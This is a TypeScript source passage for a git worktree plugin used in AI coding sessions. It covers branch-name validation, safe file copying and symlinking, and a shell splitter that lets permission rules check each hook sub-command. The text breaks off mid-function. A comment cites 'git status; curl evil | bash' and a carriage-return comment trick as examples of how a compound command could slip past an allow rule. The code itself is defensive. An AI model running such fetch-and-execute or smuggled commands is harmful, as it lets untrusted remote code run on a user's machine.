/**
 * OCX Worktree Plugin
 *
 * Creates isolated git worktrees for AI development sessions with
 * seamless terminal spawning across macOS, Windows, and Linux.
 *
 * Inspired by opencode-worktree-session by Felix Anhalt
 * https://github.com/felixAnhalt/opencode-worktree-session
 * License: MIT
 *
 * Rewritten for OCX with production-proven patterns.
 */

import type { Database } from "bun:sqlite"
import { constants as fsConstants } from "node:fs"
import { access, copyFile, cp, lstat, mkdir, realpath, rm, stat, symlink } from "node:fs/promises"
import * as os from "node:os"
import * as path from "node:path"
import { Plugin } from "@opencode/plugin"

/** Logger interface for structured logging */
interface Logger {
	debug: (msg: string) => void
	info: (msg: string) => void
	warn: (msg: string) => void
	error: (msg: string) => void
}

import { parse as parseJsonc } from "jsonc-parser"
import { z } from "zod"

import { getProjectId } from "./kdco-primitives/get-project-id"
import {
	type ActiveLaunchContext,
	buildSessionLaunchArgv,
	parseActiveLaunchContext,
	serializePersistedLaunchMetadata,
	toPersistedLaunchMetadata,
} from "./worktree/launch-context"
import {
	addSession,
	clearPendingDelete,
	getPendingDelete,
	getSession,
	getWorktreePath,
	initStateDb,
	removeSession,
	setPendingDelete,
} from "./worktree/state"
import { openTerminal, type TerminalResult } from "./worktree/terminal"

/** Maximum retries for database initialization */
const DB_MAX_RETRIES = 3

/** Delay between retry attempts in milliseconds */
const DB_RETRY_DELAY_MS = 100

/** Maximum depth to traverse session parent chain */
const MAX_SESSION_CHAIN_DEPTH = 10

// =============================================================================
// TYPES & SCHEMAS
// =============================================================================

/** Result type for fallible operations */
interface OkResult<T> {
	readonly ok: true
	readonly value: T
}
interface ErrResult<E> {
	readonly ok: false
	readonly error: E
}
type Result<T, E> = OkResult<T> | ErrResult<E>

const Result = {
	ok: <T>(value: T): OkResult<T> => ({ ok: true, value }),
	err: <E>(error: E): ErrResult<E> => ({ ok: false, error }),
}

/**
 * Git branch name validation - blocks invalid refs and shell metacharacters
 * Characters blocked: control chars (0x00-0x1f, 0x7f), ~^:?*[]\\, and shell metacharacters
 */
function isValidBranchName(name: string): boolean {
	// Check for control characters
	for (let i = 0; i < name.length; i++) {
		const code = name.charCodeAt(i)
		if (code <= 0x1f || code === 0x7f) return false
	}
	// Check for invalid git ref characters and shell metacharacters
	if (/[~^:?*[\]\\;&|`$()]/.test(name)) return false
	return true
}

const branchNameSchema = z
	.string()
	.min(1, "Branch name cannot be empty")
	.refine((name) => !name.startsWith("-"), {
		message: "Branch name cannot start with '-' (prevents option injection)",
	})
	.refine((name) => !name.startsWith("/") && !name.endsWith("/"), {
		message: "Branch name cannot start or end with '/'",
	})
	.refine((name) => !name.includes("//"), {
		message: "Branch name cannot contain '//'",
	})
	.refine((name) => !name.includes("@{"), {
		message: "Branch name cannot contain '@{' (git reflog syntax)",
	})
	.refine((name) => !name.includes(".."), {
		message: "Branch name cannot contain '..'",
	})
	// biome-ignore lint/suspicious/noControlCharactersInRegex: Control character detection is intentional for security
	.refine((name) => !/[\x00-\x1f\x7f ~^:?*[\]\\]/.test(name), {
		message: "Branch name contains invalid characters",
	})
	.max(255, "Branch name too long")
	.refine((name) => isValidBranchName(name), "Contains invalid git ref characters")
	.refine((name) => !name.startsWith(".") && !name.endsWith("."), "Cannot start or end with dot")
	.refine((name) => !name.endsWith(".lock"), "Cannot end with .lock")

/**
 * Worktree plugin configuration schema.
 * Config file: .opencode/worktree.jsonc
 */
const worktreeConfigSchema = z.object({
	/** Custom base path for worktree storage. Supports ~ for home directory. */
	worktreePath: z.string().optional(),
	sync: z
		.object({
			/** Files to copy from main worktree (relative paths only) */
			copyFiles: z.array(z.string()).default([]),
			/** Directories to symlink from main worktree (saves disk space) */
			symlinkDirs: z.array(z.string()).default([]),
			/** Patterns to exclude from copying (reserved for future use) */
			exclude: z.array(z.string()).default([]),
		})
		.default(() => ({ copyFiles: [], symlinkDirs: [], exclude: [] })),
	hooks: z
		.object({
			/** Commands to run after worktree creation */
			postCreate: z.array(z.string()).default([]),
			/** Commands to run before worktree deletion */
			preDelete: z.array(z.string()).default([]),
		})
		.default(() => ({ postCreate: [], preDelete: [] })),
})

type WorktreeConfig = z.infer<typeof worktreeConfigSchema>

// =============================================================================
// ERROR TYPES
// =============================================================================

class WorktreeError extends Error {
	constructor(
		message: string,
		public readonly operation: string,
		public readonly cause?: unknown,
	) {
		super(`${operation}: ${message}`)
		this.name = "WorktreeError"
	}
}

type ResolveExecutable = (command: string) => string | null | undefined
type ValidateProfileAvailability = (
	ocxBin: string,
	profile: string,
) => Promise<Result<void, string>>

interface LaunchExecutableValidationOptions {
	resolveExecutable?: ResolveExecutable
	pathExists?: (absolutePath: string) => Promise<boolean>
}

function isPathLikeCommand(command: string): boolean {
	return command.includes("/") || command.includes("\\")
}

function resolveStableLaunchBinaryPath(
	ocxBin: string,
	baseDirectory: string,
	resolveExecutable: ResolveExecutable,
): Result<string, string> {
	if (isPathLikeCommand(ocxBin)) {
		const resolvedPath = path.isAbsolute(ocxBin) ? ocxBin : path.resolve(baseDirectory, ocxBin)
		return Result.ok(resolvedPath)
	}

	const resolvedFromPath = resolveExecutable(ocxBin)
	if (!resolvedFromPath) {
		return Result.err(`Configured OCX binary "${ocxBin}" is not available in PATH.`)
	}

	const resolvedPath = path.isAbsolute(resolvedFromPath)
		? resolvedFromPath
		: path.resolve(baseDirectory, resolvedFromPath)

	return Result.ok(resolvedPath)
}

async function pathPointsToLaunchableBinary(absolutePath: string): Promise<boolean> {
	try {
		const stats = await stat(absolutePath)
		if (stats.isDirectory()) {
			return false
		}

		await access(absolutePath, fsConstants.X_OK)
		return true
	} catch {
		return false
	}
}

async function ensureLaunchContextExecutable(
	launchContext: ActiveLaunchContext,
	baseDirectory: string,
	options: LaunchExecutableValidationOptions = {},
): Promise<ActiveLaunchContext> {
	if (launchContext.mode === "plain") {
		return launchContext
	}

	const { ocxBin, profile } = launchContext
	const resolveExecutable = options.resolveExecutable ?? ((command: string) => Bun.which(command))
	const pathExists = options.pathExists ?? pathPointsToLaunchableBinary
	const resolvedPathResult = resolveStableLaunchBinaryPath(ocxBin, baseDirectory, resolveExecutable)
	if (!resolvedPathResult.ok) {
		throw new WorktreeError(
			`${resolvedPathResult.error} Repair the parent OCX profile (${profile}) and recreate this worktree session.`,
			"launch",
		)
	}

	const resolvedPath = resolvedPathResult.value
	const isLaunchable = await pathExists(resolvedPath)
	if (!isLaunchable) {
		throw new WorktreeError(
			`Configured OCX binary "${ocxBin}" resolved to "${resolvedPath}" but is missing or stale. Repair the parent OCX profile (${profile}) and recreate this worktree session.`,
			"launch",
		)
	}

	return {
		mode: "ocx",
		ocxBin: resolvedPath,
		profile,
	}
}

async function validateOcxProfileAvailability(
	ocxBin: string,
	profile: string,
): Promise<Result<void, string>> {
	try {
		const proc = Bun.spawn([ocxBin, "profile", "show", profile, "--global", "--json"], {
			stdout: "pipe",
			stderr: "pipe",
		})
		const [exitCode, stdout, stderr] = await Promise.all([
			proc.exited,
			new Response(proc.stdout).text(),
			new Response(proc.stderr).text(),
		])

		if (exitCode === 0) {
			return Result.ok(undefined)
		}

		const detail = stderr.trim() || stdout.trim() || `exit ${exitCode}`
		return Result.err(detail)
	} catch (error) {
		return Result.err(error instanceof Error ? error.message : String(error))
	}
}

async function ensureLaunchContextProfile(
	launchContext: ActiveLaunchContext,
	validateProfileAvailability: ValidateProfileAvailability = validateOcxProfileAvailability,
): Promise<void> {
	if (launchContext.mode === "plain") {
		return
	}

	const validationResult = await validateProfileAvailability(
		launchContext.ocxBin,
		launchContext.profile,
	)
	if (validationResult.ok) {
		return
	}

	throw new WorktreeError(
		`Configured OCX profile "${launchContext.profile}" is missing or stale. ${validationResult.error} Repair the parent OCX profile and recreate this worktree session.`,
		"launch",
	)
}

// =============================================================================
// SESSION FORKING HELPERS
// =============================================================================

/**
 * Check if a path exists, distinguishing ENOENT from other errors (Law 4)
 */
async function pathExists(filePath: string): Promise<boolean> {
	try {
		await access(filePath)
		return true
	} catch (e: unknown) {
		if (e && typeof e === "object" && "code" in e && e.code === "ENOENT") {
			return false
		}
		throw e // Re-throw permission errors, etc.
	}
}

/**
 * Copy file if source exists. Returns true if copied, false if source doesn't exist.
 * Throws on copy failure (Law 4: Fail Loud)
 */
async function copyIfExists(src: string, dest: string): Promise<boolean> {
	if (!(await pathExists(src))) return false
	await copyFile(src, dest)
	return true
}

/**
 * Copy directory contents if source exists.
 * @param src - Source directory path
 * @param dest - Destination directory path
 * @returns true if copy was performed, false if source doesn't exist
 */
async function copyDirIfExists(src: string, dest: string): Promise<boolean> {
	if (!(await pathExists(src))) return false
	await cp(src, dest, { recursive: true })
	return true
}

interface ForkResult {
	forkedSession: { id: string }
	rootSessionId: string
	planCopied: boolean
	delegationsCopied: boolean
}

interface FinalizeWorktreeLaunchOptions {
	database: Database
	worktreePath: string
	launchArgv: string[]
	branch: string
	forkedSessionId: string
	sessionRecord: {
		id: string
		branch: string
		path: string
		createdAt: string
		launchMode: "plain" | "ocx"
		profile: string | null
		ocxBin: string | null
	}
	log: Logger
	openTerminalFn?: (cwd: string, argv?: string[], windowName?: string) => Promise<TerminalResult>
	addSessionFn?: typeof addSession
	deleteForkedSessionFn?: (sessionId: string) => Promise<void>
}

async function finalizeWorktreeLaunch(
	options: FinalizeWorktreeLaunchOptions,
): Promise<TerminalResult> {
	const openTerminalFn = options.openTerminalFn ?? openTerminal
	const addSessionFn = options.addSessionFn ?? addSession
	const deleteForkedSessionFn =
		options.deleteForkedSessionFn ??
		(async (_sessionId: string) => {
			// Default no-op for tests without cleanup side effects.
		})

	const terminalResult = await openTerminalFn(
		options.worktreePath,
		options.launchArgv,
		options.branch,
	)

	if (!terminalResult.success) {
		await deleteForkedSessionFn(options.forkedSessionId).catch((cleanupError) => {
			options.log.warn(
				`[worktree] Failed to clean up forked session ${options.forkedSessionId} after launch failure: ${cleanupError}`,
			)
		})
		return terminalResult
	}

	addSessionFn(options.database, options.sessionRecord)
	return terminalResult
}

/** Subset of the V2 session context used by forkWithContext. */
interface ForkSessionOps {
	get(input: { sessionID: string }): Promise<{ id: string; title?: string; parentID?: string }>
	create(input?: {
		title?: string
		location?: { directory: string }
	}): Promise<{ id: string }>
	remove(input: { sessionID: string }): Promise<void>
}

/**
 * Fork a session and copy associated plans/delegations.
 * Cleans up forked session on failure (atomic operation).
 */
async function forkWithContext(
	ctx: { session: ForkSessionOps },
	sessionId: string,
	worktreePath: string,
	projectId: string,
	getRootSessionIdFn: (sessionId: string) => Promise<string>,
	log: Logger,
): Promise<ForkResult> {
	// Guard clauses (Law 1)
	if (!ctx) throw new WorktreeError("ctx is required", "forkWithContext")
	if (!sessionId) throw new WorktreeError("sessionId is required", "forkWithContext")
	if (!projectId) throw new WorktreeError("projectId is required", "forkWithContext")

	// Get root session ID with error wrapping
	let rootSessionId: string
	try {
		rootSessionId = await getRootSessionIdFn(sessionId)
	} catch (e) {
		throw new WorktreeError("Failed to get root session ID", "forkWithContext", e)
	}

	// V2 has no session fork: the new session has no copied message history, but this function
	// still copies plan/delegation directories keyed by the new session id.
	const source = await ctx.session.get({ sessionID: sessionId }).catch(() => undefined)
	const title = source?.title ? `${source.title} (worktree)` : "Worktree Session"
	let forkedSession: { id: string }
	try {
		forkedSession = await ctx.session.create({ title, location: { directory: worktreePath } })
	} catch (error) {
		log.warn(
			`[worktree] session create at worktree location failed; using current location: ${error instanceof Error ? error.message : String(error)}`,
		)
		forkedSession = await ctx.session.create({ title })
	}
	if (!forkedSession?.id) {
		throw new WorktreeError("Failed to fork session: no session data returned", "forkWithContext")
	}

	// Copy data with cleanup on failure
	let planCopied = false
	let delegationsCopied = false

	try {
		const workspaceBase = path.join(os.homedir(), ".local", "share", "opencode", "workspace")
		const delegationsBase = path.join(os.homedir(), ".local", "share", "opencode", "delegations")

		const destWorkspaceDir = path.join(workspaceBase, projectId, forkedSession.id)
		const destDelegationsDir = path.join(delegationsBase, projectId, forkedSession.id)

		await mkdir(destWorkspaceDir, { recursive: true })
		await mkdir(destDelegationsDir, { recursive: true })

		// Copy plan
		const srcPlan = path.join(workspaceBase, projectId, rootSessionId, "plan.md")
		const destPlan = path.join(destWorkspaceDir, "plan.md")
		planCopied = await copyIfExists(srcPlan, destPlan)

		// Copy delegations
		const srcDelegations = path.join(delegationsBase, projectId, rootSessionId)
		delegationsCopied = await copyDirIfExists(srcDelegations, destDelegationsDir)
	} catch (error) {
		log.error(`forkWithContext: Copy failed, cleaning up forked session: ${error}`)
		// Clean up orphaned directories
		const workspaceBase = path.join(os.homedir(), ".local", "share", "opencode", "workspace")
		const delegationsBase = path.join(os.homedir(), ".local", "share", "opencode", "delegations")
		const destWorkspaceDir = path.join(workspaceBase, projectId, forkedSession.id)
		const destDelegationsDir = path.join(delegationsBase, projectId, forkedSession.id)
		await rm(destWorkspaceDir, { recursive: true, force: true }).catch((e) => {
			log.error(`forkWithContext: Failed to clean up workspace dir ${destWorkspaceDir}: ${e}`)
		})
		await rm(destDelegationsDir, { recursive: true, force: true }).catch((e) => {
			log.error(`forkWithContext: Failed to clean up delegations dir ${destDelegationsDir}: ${e}`)
		})
		await ctx.session.remove({ sessionID: forkedSession.id }).catch((e) => {
			log.error(`forkWithContext: Failed to clean up forked session ${forkedSession.id}: ${e}`)
		})
		throw new WorktreeError(
			`Failed to copy session data: ${error instanceof Error ? error.message : String(error)}`,
			"forkWithContext",
			error,
		)
	}

	return { forkedSession, rootSessionId, planCopied, delegationsCopied }
}

// =============================================================================
// MODULE-LEVEL STATE
// =============================================================================

/** Database instance - initialized once per plugin lifecycle */
let db: Database | null = null

/** Project root path - stored on first initialization */
let projectRoot: string | null = null

/** Flag to prevent duplicate cleanup handler registration */
let cleanupRegistered = false

/**
 * Register process cleanup handlers for graceful database shutdown.
 * Ensures WAL checkpoint and proper close on process termination.
 *
 * NOTE: process.once() is an EventEmitter method that never throws.
 * The boolean guard is defense-in-depth for idempotency, not error recovery.
 *
 * @param database - The database instance to clean up
 */
function registerCleanupHandlers(database: Database): void {
	if (cleanupRegistered) return // Early exit guard
	cleanupRegistered = true

	const cleanup = () => {
		try {
			database.exec("PRAGMA wal_checkpoint(TRUNCATE)")
			database.close()
		} catch {
			// Best effort cleanup - process is exiting anyway
		}
	}

	process.once("SIGTERM", cleanup)
	process.once("SIGINT", cleanup)
	process.once("beforeExit", cleanup)
}

/**
 * Get the database instance, initializing if needed.
 * Includes retry logic for transient initialization failures.
 *
 * @returns Database instance
 * @throws {Error} if initialization fails after all retries
 */
async function getDb(log: Logger): Promise<Database> {
	if (db) return db

	if (!projectRoot) {
		throw new Error("Database not initialized: projectRoot not set. Call initDb() first.")
	}

	let lastError: Error | null = null

	for (let attempt = 1; attempt <= DB_MAX_RETRIES; attempt++) {
		try {
			db = await initStateDb(projectRoot)
			registerCleanupHandlers(db)
			return db
		} catch (error) {
			lastError = error instanceof Error ? error : new Error(String(error))
			log.warn(`Database init attempt ${attempt}/${DB_MAX_RETRIES} failed: ${lastError.message}`)

			if (attempt < DB_MAX_RETRIES) {
				Bun.sleepSync(DB_RETRY_DELAY_MS)
			}
		}
	}

	throw new Error(
		`Failed to initialize database after ${DB_MAX_RETRIES} attempts: ${lastError?.message}`,
	)
}

/**
 * Initialize the database with the project root path.
 * Must be called once before any getDb() calls.
 */
async function initDb(root: string, log: Logger): Promise<Database> {
	projectRoot = root
	return getDb(log)
}

// =============================================================================
// GIT MODULE
// =============================================================================

/**
 * Execute a git command safely using Bun.spawn with explicit array.
 * Avoids shell interpolation entirely by passing args as array.
 */
async function git(args: string[], cwd: string): Promise<Result<string, string>> {
	try {
		const proc = Bun.spawn(["git", ...args], {
			cwd,
			stdout: "pipe",
			stderr: "pipe",
		})
		const [stdout, stderr, exitCode] = await Promise.all([
			new Response(proc.stdout).text(),
			new Response(proc.stderr).text(),
			proc.exited,
		])
		if (exitCode !== 0) {
			return Result.err(stderr.trim() || `git ${args[0]} failed`)
		}
		return Result.ok(stdout.trim())
	} catch (error) {
		return Result.err(error instanceof Error ? error.message : String(error))
	}
}

async function branchExists(cwd: string, branch: string): Promise<boolean> {
	const result = await git(["rev-parse", "--verify", branch], cwd)
	return result.ok
}

async function createWorktree(
	repoRoot: string,
	branch: string,
	baseBranch?: string,
	basePath?: string,
): Promise<Result<string, string>> {
	const worktreePath = await getWorktreePath(repoRoot, branch, basePath)

	// Ensure parent directory exists
	await mkdir(path.dirname(worktreePath), { recursive: true })

	const exists = await branchExists(repoRoot, branch)

	if (exists) {
		// Checkout existing branch into worktree
		const result = await git(["worktree", "add", worktreePath, branch], repoRoot)
		return result.ok ? Result.ok(worktreePath) : result
	} else {
		// Create new branch from base
		const base = baseBranch ?? "HEAD"
		const result = await git(["worktree", "add", "-b", branch, worktreePath, base], repoRoot)
		return result.ok ? Result.ok(worktreePath) : result
	}
}

async function removeWorktree(
	repoRoot: string,
	worktreePath: string,
): Promise<Result<void, string>> {
	// No --force: refuse to delete a worktree that still holds uncommitted or
	// untracked files rather than silently destroying them.
	const result = await git(["worktree", "remove", worktreePath], repoRoot)
	return result.ok ? Result.ok(undefined) : Result.err(result.error)
}

// =============================================================================
// FILE SYNC MODULE
// =============================================================================

/**
 * Validate that a path is safe (no escape from base directory)
 */
function isPathSafe(filePath: string, baseDir: string, log: Logger): boolean {
	// Reject absolute paths
	if (path.isAbsolute(filePath)) {
		log.warn(`[worktree] Rejected absolute path: ${filePath}`)
		return false
	}
	// Reject obvious path traversal
	if (filePath.includes("..")) {
		log.warn(`[worktree] Rejected path traversal: ${filePath}`)
		return false
	}
	// Verify resolved path stays within base directory
	const resolved = path.resolve(baseDir, filePath)
	if (!resolved.startsWith(baseDir + path.sep) && resolved !== baseDir) {
		log.warn(`[worktree] Path escapes base directory: ${filePath}`)
		return false
	}
	return true
}

function isWithinRealRoot(rootRealPath: string, candidateRealPath: string): boolean {
	const relative = path.relative(rootRealPath, candidateRealPath)
	return relative === "" || (!!relative && !relative.startsWith("..") && !path.isAbsolute(relative))
}

async function resolveExistingPathWithinRoot(
	rootDir: string,
	relativePath: string,
	log: Logger,
): Promise<string | null> {
	const rootRealPath = await realpath(rootDir).catch(() => null)
	if (!rootRealPath) {
		log.warn(`[worktree] Failed to resolve worktree root: ${rootDir}`)
		return null
	}

	const candidatePath = path.resolve(rootDir, relativePath)
	const candidateRealPath = await realpath(candidatePath).catch(() => null)
	if (!candidateRealPath) return null

	if (!isWithinRealRoot(rootRealPath, candidateRealPath)) {
		log.warn(`[worktree] Rejected path escaping worktree via symlink: ${relativePath}`)
		return null
	}

	return candidateRealPath
}

async function ensureDirectoryWithinRoot(
	rootDir: string,
	relativeDir: string,
	log: Logger,
): Promise<string | null> {
	const rootRealPath = await realpath(rootDir).catch(() => null)
	if (!rootRealPath) {
		log.warn(`[worktree] Failed to resolve worktree root: ${rootDir}`)
		return null
	}

	const rootPath = path.resolve(rootDir)
	const targetDir = path.resolve(rootDir, relativeDir)
	const resolvedRootRelative = path.relative(rootPath, targetDir)
	if (
		resolvedRootRelative !== "" &&
		(resolvedRootRelative.startsWith("..") || path.isAbsolute(resolvedRootRelative))
	) {
		log.warn(`[worktree] Rejected path escaping worktree: ${relativeDir}`)
		return null
	}

	const rootRelative = path.relative(rootDir, targetDir)
	const parts = rootRelative.split(path.sep).filter(Boolean)
	let cursor = rootDir

	for (const part of parts) {
		cursor = path.join(cursor, part)
		const entry = await lstat(cursor).catch(() => null)
		if (entry?.isSymbolicLink()) {
			log.warn(`[worktree] Rejected symlinked target parent: ${relativeDir}`)
			return null
		}
		if (entry && !entry.isDirectory()) {
			log.warn(`[worktree] Rejected non-directory target parent: ${relativeDir}`)
			return null
		}
		if (!entry) {
			await mkdir(cursor)
		}
	}

	const finalRealPath = await realpath(targetDir).catch(() => null)
	if (!finalRealPath || !isWithinRealRoot(rootRealPath, finalRealPath)) {
		log.warn(`[worktree] Rejected path escaping worktree via symlink: ${relativeDir}`)
		return null
	}

	return targetDir
}

/**
 * Copy files from source directory to target directory.
 * Skips missing files silently (production pattern).
 */
async function copyFiles(
	sourceDir: string,
	targetDir: string,
	files: string[],
	log: Logger,
): Promise<void> {
	for (const file of files) {
		if (!isPathSafe(file, sourceDir, log)) continue

		const sourcePath = await resolveExistingPathWithinRoot(sourceDir, file, log)
		if (!sourcePath) continue

		const targetPath = path.join(targetDir, file)

		try {
			const sourceFile = Bun.file(sourcePath)
			if (!(await sourceFile.exists())) {
				log.debug(`[worktree] Skipping missing file: ${file}`)
				continue
			}

			// Ensure target directory exists
			const targetFileDir = path.dirname(targetPath)
			const targetFileRelativeDir = path.relative(targetDir, targetFileDir)
			if (!(await ensureDirectoryWithinRoot(targetDir, targetFileRelativeDir, log))) continue

			const existingTarget = await lstat(targetPath).catch(() => null)
			if (existingTarget?.isSymbolicLink()) {
				log.warn(`[worktree] Rejected symlinked target file: ${file}`)
				continue
			}

			// Copy file
			await Bun.write(targetPath, sourceFile)
			log.info(`[worktree] Copied: ${file}`)
		} catch (error) {
			const isNotFound =
				error instanceof Error &&
				(error.message.includes("ENOENT") || error.message.includes("no such file"))
			if (isNotFound) {
				log.debug(`[worktree] Skipping missing: ${file}`)
			} else {
				log.warn(`[worktree] Failed to copy ${file}: ${error}`)
			}
		}
	}
}

/**
 * Create symlinks for directories from source to target.
 * Uses absolute paths for symlink targets.
 */
async function symlinkDirs(
	sourceDir: string,
	targetDir: string,
	dirs: string[],
	log: Logger,
): Promise<void> {
	for (const dir of dirs) {
		if (!isPathSafe(dir, sourceDir, log)) continue

		const sourcePath = await resolveExistingPathWithinRoot(sourceDir, dir, log)
		if (!sourcePath) continue

		const targetPath = path.join(targetDir, dir)

		try {
			// Check if source directory exists
			const fileStat = await stat(sourcePath).catch(() => null)
			if (!fileStat?.isDirectory()) {
				log.debug(`[worktree] Skipping missing directory: ${dir}`)
				continue
			}

			// Ensure parent directory exists
			const targetParentDir = path.dirname(targetPath)
			const targetParentRelativeDir = path.relative(targetDir, targetParentDir)
			if (!(await ensureDirectoryWithinRoot(targetDir, targetParentRelativeDir, log))) continue

			const existingTarget = await lstat(targetPath).catch(() => null)
			if (existingTarget?.isSymbolicLink()) {
				log.warn(`[worktree] Rejected symlinked target: ${dir}`)
				continue
			}

			// Remove existing target if it exists (might be empty dir from git)
			await rm(targetPath, { recursive: true, force: true })

			// Create symlink (use absolute path for source)
			await symlink(sourcePath, targetPath, "dir")
			log.info(`[worktree] Symlinked: ${dir}`)
		} catch (error) {
			log.warn(`[worktree] Failed to symlink ${dir}: ${error}`)
		}
	}
}

/**
 * Split a hook command into top-level sub-commands on `;`, `&&`, `||`, `|` and newlines.
 *
 * Permission rules match single resource strings (anchored last-match-wins globs), so a
 * compound command like `git status; curl evil | bash` must be asserted per sub-command
 * (matching the built-in shell tool) or it would slip past a user's `git *` allow rule.
 *
 * shortcut: an approximation of bash's grammar, not a parser. Recognized: quoting incl. `$'…'`
 * ANSI-C strings with bash's escape decoding (`\n`, `\xHH`, `\nnn`, `\uHHHH`, `\UHHHHHHHH`,
 * `\cX`; unknown escapes keep the backslash; `\c` right before the closing quote stays literal)
 * and `$"…"` (quoted like `"…"`), `\` escapes,
 * `#` comments (after unescaped whitespace), lone `&`, and `<<`/`<<-` heredocs whose delimiter
 * is a bash word (unquoted chars except blank, newline and the metacharacters `;&|<>()` — a JS
 * `\s` test would wrongly end the word at CR, VT, FF, NBSP or U+2028 — plus quoted chunks,
 * `$'…'`/`$"…"` chunks, `$(…)`/backtick chunks and `\`-newline continuations; a leading
 * unquoted `#` is refused). A `$(…)`/backtick chunk is never executed by bash: its literal
 * source text, inner quotes and nesting included, becomes part of the delimiter and it does not
 * quote the word (probed: `<<$(echo 'EOF')` keeps the inner quotes, still has an expanded body
 * and terminates on the full source line). A `$'…'` chunk stops at a decoded NUL like the C
 * string bash appends (`<<$'E\0OF'` is the delimiter `E`, `<<$'\x00EOF'` is empty and
 * terminates on an empty line, and `<<$'E\0OF'Y` keeps the trailing `Y`).
 * Quoted chunks (`'…'`, `"…"`, `$'…'`, `$"…"`) store bash's protected bytes: 0x01 becomes
 * `01 01` and 0x7f becomes `01 7f` before the terminator comparison (probed for raw and
 * decoded bytes), while plain word chars, `\`-escaped chars and `$(…)`/backtick source text
 * compare raw — a line must spell the protected bytes to terminate (`<<$'E\x01OF'` needs an
 * `E`, 01, 01, `OF` line, not a single-0x01 one).
 * Inside a heredoc body quotes, `\` and `#` are plain data, and body mode only engages at a
 * top-level newline when every terminator line exists, matched the way bash matches
 * terminators: quoted delimiter words compare their line raw, unquoted words first remove
 * `\`-newline continuations (a line with an odd trailing-backslash count continues into the
 * next line), and `<<-` strips leading tabs of the joined line. A newline inside a `$(…)`/
 * backtick span never engages body mode — it is command text, so `cat <<"cat x)" $(echo\ncat x)`
 * starts its body after the closing `)` (probed; without this the phantom terminator cut the
 * real body short and later commands merged into a `cat …` piece with no prompt).
 * Gaps that can still under-split: `\c` whose target is another escape — bash masks the
 * literal `\` and keeps the rest, while this model decodes the escape (`$'E\c\''` is `E` 1c `'`
 * in bash, `$'E\c\nOF'` is `E` 1c `nOF`; a terminator from such a word can be missed and its
 * body merge over bash-live text — see FOLLOWUPS.md); a substitution whose source itself
 * contains `<<` (probed: bash fails parsing inside the substitution and runs nothing after it;
 * the literal word can also seed an extra bogus terminator, still over dead text); and a
 * delimiter that spans physical lines (bash never terminates that heredoc either). Outside the
 * first gap, a fallback merge only covers text bash never executes: beyond the terminating
 * NUL, escape values that decode to bytes the UTF-8 command text cannot carry (`\xHH`/`\nnn` ≥
 * 0x80, `\U` beyond U+10FFFF) leave bash's terminator line unreachable too, so a mismatch there
 * can only over-split.
 * Refused words that bash itself rejects (unterminated quote or substitution, `\` at end of
 * input) make bash syntax-error out, so nothing there executes; `<<` inside arithmetic
 * (`let x=1<<2`) is also refused and can pick up a bogus word when not followed by
 * `)`-style metacharacters, which at worst asserts bash's still-live text line by line.
 */
function splitHookCommands(command: string): string[] {
	const segments: string[] = []
	const heredocs: { delimiter: string; stripTabs: boolean; quoted: boolean }[] = []
	let current = ""
	let quote: "'" | '"' | undefined
	let ansiQuote = false
	let lastCharEscaped = false
	let bodyUntil = 0
	// `$(…)`/backtick spans whose interior newlines are command text, not line ends.
	const subEnds: number[] = []
	let backtickEnd = -1
	for (let i = 0; i < command.length; i++) {
		const char = command[i]
		while (subEnds.length > 0 && i >= subEnds[subEnds.length - 1]) subEnds.pop()
		if (backtickEnd !== -1 && i >= backtickEnd) backtickEnd = -1
		if (quote) {
			current += char
			// ANSI-C (`$'…'`) strings honor `\` escapes, so `\'` must not close the string.
			if (char === "\\" && (quote === '"' || ansiQuote) && i + 1 < command.length) {
				current += command[++i]
				lastCharEscaped = true
				continue
			}
			lastCharEscaped = false
			if (char === quote) {
				quote = undefined
				ansiQuote = false
			}
			continue
		}
		if (char === "\\" && i >= bodyUntil) {
			// Outside quotes bash treats `\x` as a literal pair (`\"` must not open a quote).
			// Heredoc bodies are data: there a `\` must not swallow the following newline, or
			// body text, terminators and trailing commands would merge into one piece.
			current += char
			lastCharEscaped = false
			if (i + 1 < command.length) {
				current += command[++i]
				lastCharEscaped = true
			}
			continue
		}
		if (i >= bodyUntil && (char === "'" || char === '"')) {
			ansiQuote = char === "'" && command[i - 1] === "$" && !lastCharEscaped
			quote = char
			current += char
			lastCharEscaped = false
			continue
		}
		if (
			char === "#" &&
			i >= bodyUntil &&
			!lastCharEscaped &&
			(current.length === 0 || /[ \t]/.test(current[current.length - 1]))
		) {
			// Comment to end of line; only at a word start, and never inside a heredoc body
			// (there `#` is data). Only space/tab precede a comment word start: chars a JS
			// `\s` test also matches (CR, VT, FF, NBSP, U+2028, …) are ordinary word chars
			// in bash, so a `#` after one of them belongs to the word (`cat\r#; evil` runs
			// `evil`). Conservative on purpose: a missed comment over-splits, a wrong one
			// would drop text bash still runs.
			while (i + 1 < command.length && command[i + 1] !== "\n") i++
			continue
		}
		if (i >= bodyUntil && char === "$" && command[i + 1] === "(") {
			// A substitution is one unit to bash: the newlines inside it are command text, so
			// they are not top-level line ends and must not fire the heredoc-body search.
			// `cat <<"cat x)" $(echo\ncat x)` starts its body after the closing `)`, not
			// after the newline between `echo` and `cat x` — otherwise the phantom body cuts
			// the real one short and later commands merge into a `cat …` piece with no
			// prompt. The interior still scans char-wise, so commands in a substitution stay
			// asserted as their own pieces.
			const span = consumeCommandSubstitution(command, i, "raw")
			if (span !== undefined) subEnds.push(span.next)
		}
		if (i >= bodyUntil && char === "`" && backtickEnd === -1) {
			// Same for backtick chunks: the body can only start after the closing backtick.
			// The flag keeps the closing backtick from being read as a new opening (that
			// would leave a span open forever and suppress real line ends).
			const span = consumeBacktickWord(command, i, "raw")
			if (span !== undefined) {
				subEnds.push(span.next)
				backtickEnd = span.next
			}
		}
		if (char === "\n" || char === ";") {
			segments.push(current)
			current = ""
			lastCharEscaped = false
			if (char === "\n" && heredocs.length > 0 && subEnds.length === 0 && backtickEnd === -1) {
				// Heredoc body mode: engages at a top-level newline when every terminator
				// line is found (matched the way bash matches them, see findHeredocEnd); a
				// newline inside a `$(…)`/backtick span never engages it, since the body
				// can only start after the span closes. Body text is data (bash never
				// evaluates it), so quotes, `\` and `#` stay literal there: that can only
				// add prompts, never swallow a newline and merge the terminator with later
				// commands. Without a terminator the text falls back to the line-wise scan
				// — a merge there is only reachable for the word shapes bash itself never
				// terminates (see the gaps in splitHookCommands).

				const end = findHeredocEnd(command, i + 1, heredocs)
				heredocs.length = 0
				if (end !== undefined) bodyUntil = end
			}
			continue
		}
		if (
			i >= bodyUntil &&
			char === "<" &&
			command[i - 1] !== "<" &&
			command[i + 1] === "<" &&
			command[i + 2] !== "<"
		) {
			const stripTabs = command[i + 2] === "-"
